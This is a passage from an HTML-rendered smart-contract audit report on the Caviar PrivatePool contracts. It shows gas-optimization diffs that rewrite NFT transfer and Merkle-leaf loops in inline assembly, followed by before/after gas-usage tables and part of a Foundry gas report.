class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">498</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"139\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..b22c813 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -493,8 +493,27 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ~~~ Interactions ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // transfer the nfts from the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        for (uint256 i = 0; i &lt; tokenIds.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            ERC721(nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address _nft = nft;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assembly {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if tokenIds.length {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                let memptr := mload(0x40)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                let end := add(tokenIds.offset, mul(0x20, tokenIds.length))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                let i := tokenIds.offset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x00, 0x42842e0e)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x20, caller())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x40, address())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                for {} 1 {} {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(0x60, calldataload(i))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    let success := call(gas(), _nft, 0x00, 0x1c, 0x64, 0x00, 0x00)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    if iszero(success) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        revert(0, 0)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    i := add(i, 0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    if iszero(lt(i, end)) { break }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x40, memptr)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x60, 0x00)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L518-L520\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L518-L520</a></p>\n<p><em>Gas Savings for <code>PrivatePool.withdraw</code>, obtained via protocol’s tests: Avg 985 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>81842</td>\n<td>81842</td>\n<td>62023</td>\n<td>5</td>\n</tr>\n<tr>\n<td>After</td>\n<td>80547</td>\n<td>80547</td>\n<td>61038</td>\n<td>5</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"140\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">518</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">519</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">520</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"141\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..4211c9e 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -515,8 +515,26 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ~~~ Interactions ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // transfer the nfts to the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        for (uint256 i = 0; i &lt; tokenIds.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            ERC721(_nft).safeTransferFrom(address(this), msg.sender, tokenIds[i]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assembly {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if tokenIds.length {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                let memptr := mload(0x40)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                let end := add(tokenIds.offset, mul(0x20, tokenIds.length))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                let i := tokenIds.offset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x00, 0x42842e0e)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x20, address())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x40, caller())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                for {} 1 {} {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(0x60, calldataload(i))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    let success := call(gas(), calldataload(0x04), 0x00, 0x1c, 0x64, 0x00, 0x00)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    if iszero(success) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        revert(0, 0)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    i := add(i, 0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    if iszero(lt(i, end)) { break }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x40, memptr)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x60, 0x00)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L673-L679\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L673-L679</a></p>\n<p><strong>Note: <code>PrivatePool.sumWeightsAndValidateProof</code> is called by all the functions below</strong>.</p>\n<p><em>Gas Savings for <code>PrivatePool.buy</code>, obtained via protocol’s tests: Avg 33 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>74037</td>\n<td>158864</td>\n<td>70884</td>\n<td>24</td>\n</tr>\n<tr>\n<td>After</td>\n<td>74037</td>\n<td>158864</td>\n<td>70851</td>\n<td>24</td>\n</tr>\n</tbody>\n</table>\n<p><em>Gas Savings for <code>PrivatePool.sell</code>, obtained via protocol’s tests: Avg 74 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>50139</td>\n<td>170448</td>\n<td>81969</td>\n<td>25</td>\n</tr>\n<tr>\n<td>After</td>\n<td>50139</td>\n<td>170448</td>\n<td>81895</td>\n<td>25</td>\n</tr>\n</tbody>\n</table>\n<p><em>Gas Savings for <code>PrivatePool.change</code>, obtained via protocol’s tests: Avg 157 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>116432</td>\n<td>142008</td>\n<td>82138</td>\n<td>17</td>\n</tr>\n<tr>\n<td>After</td>\n<td>116432</td>\n<td>142008</td>\n<td>81981</td>\n<td>17</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"142\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">673</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">674</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// create the leaf for the merkle proof</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">675</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">leafs</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">.</span><span class=\"mtk11\">concat</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">], </span><span class=\"mtk12\">tokenWeights</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]))));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">676</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">677</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// sum each token weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">678</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">sum</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">tokenWeights</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">679</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"143\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..7d63e8e 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -670,12 +670,25 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 sum;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         bytes32[] memory leafs = new bytes32[](tokenIds.length);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        for (uint256 i = 0; i &lt; tokenIds.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            // create the leaf for the merkle proof</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            leafs[i] = keccak256(bytes.concat(keccak256(abi.encode(tokenIds[i], tokenWeights[i]))));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            // sum each token weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            sum += tokenWeights[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assembly {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if mload(tokenIds) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                let end := add(add(tokenIds, 0x20), mul(0x20, mload(tokenIds)))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                let i := add(tokenIds, 0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                let j := add(tokenWeights, 0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                let k := add(leafs, 0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                for {} 1 {} {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(0x00, mload(i))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(0x20, mload(j))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(0x00, keccak256(0x00, 0x40))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    let hash := keccak256(0x00, 0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(k, hash)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    sum := add(sum, mload(j))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    i := add(i, 0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    j := add(j, 0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    k := add(k, 0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    if iszero(lt(i, end)) { break }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<h2 id=\"gasreport-output-with-all-optimizations-applied\" style=\"position:relative;\"><a href=\"#gasreport-output-with-all-optimizations-applied\" aria-label=\"gasreport output with all optimizations applied permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><code>GasReport</code> output, with all optimizations applied</h2>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"144\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EthRouter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk12\">EthRouter</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> |                 |        |        |        |         |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">|--------------------------------------|-----------------|--------|--------|--------|---------|</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">Deployment</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Cost</span><span class=\"mtk1\">                      | </span><span class=\"mtk12\">Deployment</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Size</span><span class=\"mtk1\"> |        |        |        |         |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk7\">1415709</span><span class=\"mtk1\">                              | </span><span class=\"mtk7\">7247</span><span class=\"mtk1\">            |        |        |        |         |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk10\">Function</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Name</span><span class=\"mtk1\">                        | </span><span class=\"mtk12\">min</span><span class=\"mtk1\">             | </span><span class=\"mtk12\">avg</span><span class=\"mtk1\">    | </span><span class=\"mtk12\">median</span><span class=\"mtk1\"> | </span><span class=\"mtk12\">max</span><span class=\"mtk1\">    | # </span><span class=\"mtk12\">calls</span><span class=\"mtk1\"> |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">buy</span><span class=\"mtk1\">                                  | </span><span class=\"mtk7\">658</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">190464</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">179510</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">374824</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">7</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">change</span><span class=\"mtk1\">                               | </span><span class=\"mtk7\">576</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">202568</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">265225</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">279247</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">4</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">deposit</span><span class=\"mtk1\">                              | </span><span class=\"mtk7\">773</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">29393</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">2361</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">112078</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">4</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">onERC721Received</span><span class=\"mtk1\">                     | </span><span class=\"mtk7\">698</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">698</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">698</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">698</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">92</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">receive</span><span class=\"mtk1\">                              | </span><span class=\"mtk7\">55</span><span class=\"mtk1\">              | </span><span class=\"mtk7\">55</span><span class=\"mtk1\">     | </span><span class=\"mtk7\">55</span><span class=\"mtk1\">     | </span><span class=\"mtk7\">55</span><span class=\"mtk1\">     | </span><span class=\"mtk7\">16</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">sell</span><span class=\"mtk1\">                                 | </span><span class=\"mtk7\">732</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">223981</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">209434</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">388776</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">7</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Factory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk12\">Factory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> |                 |        |        |        |         |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">|----------------------------------|-----------------|--------|--------|--------|---------|</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">Deployment</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Cost</span><span class=\"mtk1\">                  | </span><span class=\"mtk12\">Deployment</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Size</span><span class=\"mtk1\"> |        |        |        |         |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk7\">1403424</span><span class=\"mtk1\">                          | </span><span class=\"mtk7\">7270</span><span class=\"mtk1\">            |        |        |        |         |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk10\">Function</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Name</span><span class=\"mtk1\">                    | </span><span class=\"mtk12\">min</span><span class=\"mtk1\">             | </span><span class=\"mtk12\">avg</span><span class=\"mtk1\">    | </span><span class=\"mtk12\">median</span><span class=\"mtk1\"> | </span><span class=\"mtk12\">max</span><span class=\"mtk1\">    | # </span><span class=\"mtk12\">calls</span><span class=\"mtk1\"> |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">create</span><span class=\"mtk1\">                           | </span><span class=\"mtk7\">1641</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">148672</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">161112</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">243941</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">35</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">ownerOf</span><span class=\"mtk1\">                          | </span><span class=\"mtk7\">0</span><span class=\"mtk1\">               | </span><span class=\"mtk7\">20</span><span class=\"mtk1\">     | </span><span class=\"mtk7\">0</span><span class=\"mtk1\">      | </span><span class=\"mtk7\">622</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">30</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">predictPoolDeploymentAddress</span><span class=\"mtk1\">     | </span><span class=\"mtk7\">2868</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">2868</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">2868</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">2868</span><span class=\"mtk1\">   | </span><span 